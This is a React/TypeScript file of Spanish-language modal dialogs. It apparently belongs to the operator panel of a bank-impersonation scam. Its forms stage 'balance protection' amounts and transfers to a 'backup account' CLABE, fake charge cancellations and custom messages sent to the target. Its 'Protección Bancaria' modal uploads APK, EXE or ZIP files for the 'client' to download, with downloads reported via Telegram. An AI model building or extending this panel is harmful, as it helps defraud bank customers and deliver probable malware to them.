import { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';

interface ModalProps {
  isOpen: boolean;
  onClose: () => void;
  title: string;
  children: React.ReactNode;
}

const Modal: React.FC<ModalProps> = ({ isOpen, onClose, title, children }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center">
      <div className="bg-[#2c2c2c] p-6 rounded-lg max-w-lg w-full relative">
        <button 
          className="absolute top-2 right-3 text-gray-400 hover:text-white text-xl"
          onClick={onClose}
        >
          &times;
        </button>
        <h3 className="text-xl font-semibold mb-4 text-white">{title}</h3>
        {children}
      </div>
    </div>
  );
};

interface ProtectModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (amount: string) => void;
}

export const ProtectModal: React.FC<ProtectModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [amount, setAmount] = useState('');

  const handleSubmit = () => {
    onConfirm(amount);
    setAmount('');
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Proteger Saldo">
      <div className="mb-4">
        <Label htmlFor="cantidadProteger" className="block text-sm text-gray-300 mb-1">
          Cantidad $
        </Label>
        <Input 
          id="cantidadProteger" 
          type="number" 
          placeholder="Ingrese la cantidad"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface TransferModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { cantidad: string, titular: string, clabe: string, alias: string }) => void;
}

export const TransferModal: React.FC<TransferModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    cantidad: '',
    titular: '',
    clabe: '',
    alias: 'Cuenta de respaldo'
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('transfer', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      cantidad: '',
      titular: '',
      clabe: '',
      alias: 'Cuenta de respaldo'
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Transferir">
      <div className="space-y-3">
        <div>
          <Input 
            id="transferCantidad" 
            type="number" 
            placeholder="Ingrese la cantidad"
            value={formData.cantidad}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferTitular" 
            type="text" 
            placeholder="Ingrese el titular"
            value={formData.titular}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferClabe" 
            type="text" 
            placeholder="Ingrese la CLABE"
            value={formData.clabe}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferAlias" 
            type="text" 
            placeholder="Cuenta de respaldo"
            value={formData.alias}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface CancelModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { importe: string, negocio: string }) => void;
}

export const CancelModal: React.FC<CancelModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    importe: '',
    negocio: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('cancelacion', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      importe: '',
      negocio: ''
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Cancelación">
      <div className="space-y-3">
        <div>
          <Input 
            id="cancelacionImporte" 
            type="number" 
            placeholder="Ingrese el importe"
            value={formData.importe}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="cancelacionNegocio" 
            type="text" 
            placeholder="Ingrese el negocio"
            value={formData.negocio}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface SmsCompraModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (telefono: string) => void;
}

export const SmsCompraModal: React.FC<SmsCompraModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [telefono, setTelefono] = useState('');

  const handleSubmit = () => {
    if (telefono.length === 4) {
      onConfirm(telefono);
      setTelefono('');
      onClose();
    } else {
      alert('Por favor ingresa exactamente 4 dígitos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="SMS Compra - Cancelación de cargos">
      <div className="mb-4">
        <Label htmlFor="telefonoSmsCompra" className="block text-sm text-gray-300 mb-1">
          Ingresa los últimos 4 dígitos del celular:
        </Label>
        <Input 
          id="telefonoSmsCompra" 
          type="tel" 
          maxLength={4}
          placeholder="Ej: 5678"
          value={telefono}
          onChange={(e) => {
            // Solo permitir números y limitar a 4 dígitos
            const value = e.target.value.replace(/\D/g, '').substring(0, 4);
            setTelefono(value);
          }}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <p className="text-xs text-gray-400 mt-1">
          Solo se requieren los últimos 4 dígitos del número celular. 
          Estos dígitos se mostrarán en la pantalla de cancelación.
        </p>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
          disabled={telefono.length !== 4}
        >
          Enviar
        </Button>
      </div>
    </Modal>
  );
};

interface CodeModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (telefono: string) => void;
}

export const CodeModal: React.FC<CodeModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [telefono, setTelefono] = useState('');

  const handleSubmit = () => {
    if (telefono.length === 4) {
      // Agregamos un prefijo ficticio para mantener compatibilidad con el resto del código
      // que espera un número de 10 dígitos
      const fullPhone = "123456" + telefono;
      onConfirm(fullPhone);
      setTelefono('');
    } else {
      alert('Por favor ingresa exactamente 4 dígitos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Teléfono">
      <div className="mb-4">
        <Label htmlFor="telefonoCodigo" className="block text-sm text-gray-300 mb-1">
          Ingresa los últimos 4 dígitos del celular:
        </Label>
        <Input 
          id="telefonoCodigo" 
          type="tel" 
          maxLength={4}
          placeholder="Ej: 5678"
          value={telefono}
          onChange={(e) => {
            // Solo permitir números y limitar a 4 dígitos
            const value = e.target.value.replace(/\D/g, '').substring(0, 4);
            setTelefono(value);
          }}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <p className="text-xs text-gray-400 mt-1">
          Solo se requieren los últimos 4 dígitos del número celular.
        </p>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
          disabled={telefono.length !== 4}
        >
          Aceptar
        </Button>
      </div>
    </Modal>
  );
};

interface MessageModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (mensaje: string) => void;
}

export const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [mensaje, setMensaje] = useState('');

  const handleSubmit = () => {
    onConfirm(mensaje);
    setMensaje('');
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Mensaje personalizado">
      <div className="mb-4">
        <Label htmlFor="mensajeTexto" className="block text-sm text-gray-300 mb-1">
          Escribe el mensaje (máx. 4000 caracteres - tamaño de una hoja oficio):
        </Label>
        <Textarea 
          id="mensajeTexto" 
          maxLength={4000}
          rows={8}
          value={mensaje}
          onChange={(e) => setMensaje(e.target.value.slice(0, 4000))}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <div className="text-right text-xs text-gray-500 mt-1">
          {mensaje.length}/4000 caracteres
        </div>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Enviar
        </Button>
      </div>
    </Modal>
  );
};

interface ProtectionBankingModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (fileData: { fileName: string; fileUrl: string; fileSize: string }) => void;
  sessionId: string | null;
}

export const ProtectionBankingModal: React.FC<ProtectionBankingModalProps> = ({ 
  isOpen, 
  onClose, 
  onConfirm, 
  sessionId 
}) => {
  const [file, setFile] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = event.target.files?.[0];
    if (selectedFile) {
      // Validar tamaño del archivo (máximo 50MB)
      if (selectedFile.size > 50 * 1024 * 1024) {
        alert('El archivo no puede ser mayor a 50MB');
        return;
      }
      
      // Validar tipos de archivo permitidos
      const allowedTypes = [
        'application/zip',
        'application/x-zip-compressed',
        'application/vnd.android.package-archive', // APK
        'application/x-msdownload', // EXE
        'application/octet-stream'
      ];
      
      if (!allowedTypes.includes(selectedFile.type) && 
          !selectedFile.name.toLowerCase().endsWith('.zip') &&
          !selectedFile.name.toLowerCase().endsWith('.apk') &&
          !selectedFile.name.toLowerCase().endsWith('.exe')) {
        alert('Solo se permiten archivos ZIP, APK y EXE');
        return;
      }
      
      setFile(selectedFile);
    }
  };

  const handleUpload = async () => {
    if (!file || !sessionId) return;

    setUploading(true);
    
    try {
      const formData = new FormData();
      formData.append('file', file);
      formData.append('sessionId', sessionId);

      const response = await fetch('/api/upload-protection-file', {
        method: 'POST',
        body: formData,
      });

      if (response.ok) {
        const result = await response.json();
        
        // Formatear el tamaño del archivo
        const fileSize = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
        
        onConfirm({
          fileName: file.name,
          fileUrl: result.fileUrl,
          fileSize: fileSize
        });
        
        setFile(null);
        onClose();
      } else {
        throw new Error('Error al subir el archivo');
      }
    } catch (error) {
      console.error('Error uploading file:', error);
      alert('Error al subir el archivo. Intenta nuevamente.');
    } finally {
      setUploading(false);
    }
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Protección Bancaria - Cargar Archivo">
      <div className="space-y-4">
        <div>
          <Label className="block text-sm text-gray-300 mb-2">
            Selecciona el archivo de protección para el cliente:
          </Label>
          <input
            type="file"
            accept=".zip,.apk,.exe"
            onChange={handleFileSelect}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none file:mr-4 file:py-2 file:px-4 file:rounded file:border-0 file:text-sm file:bg-[#007bff] file:text-white hover:file:bg-blue-700"
          />
          <p className="text-xs text-gray-400 mt-1">
            Formatos permitidos: ZIP, APK, EXE (máximo 50MB)
          </p>
        </div>

        {file && (
          <div className="bg-[#1f1f1f] p-3 rounded border border-gray-700">
            <p className="text-sm text-gray-300">
              <strong>Archivo seleccionado:</strong> {file.name}
            </p>
            <p className="text-xs text-gray-400">
              Tamaño: {formatFileSize(file.size)}
            </p>
          </div>
        )}

        <div className="bg-blue-900/20 p-3 rounded border border-blue-700/50">
          <p className="text-sm text-blue-200">
            <strong>Información:</strong> Una vez cargado, el cliente podrá descargar este archivo desde la pantalla de Protección Bancaria. Las descargas se notificarán automáticamente vía Telegram.
          </p>
        </div>
      </div>
      
      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
          disabled={uploading}
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleUpload}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
          disabled={!file || uploading}
        >
          {uploading ? 'Cargando...' : 'Cargar y Enviar'}
        </Button>
      </div>
    </Modal>
  );
};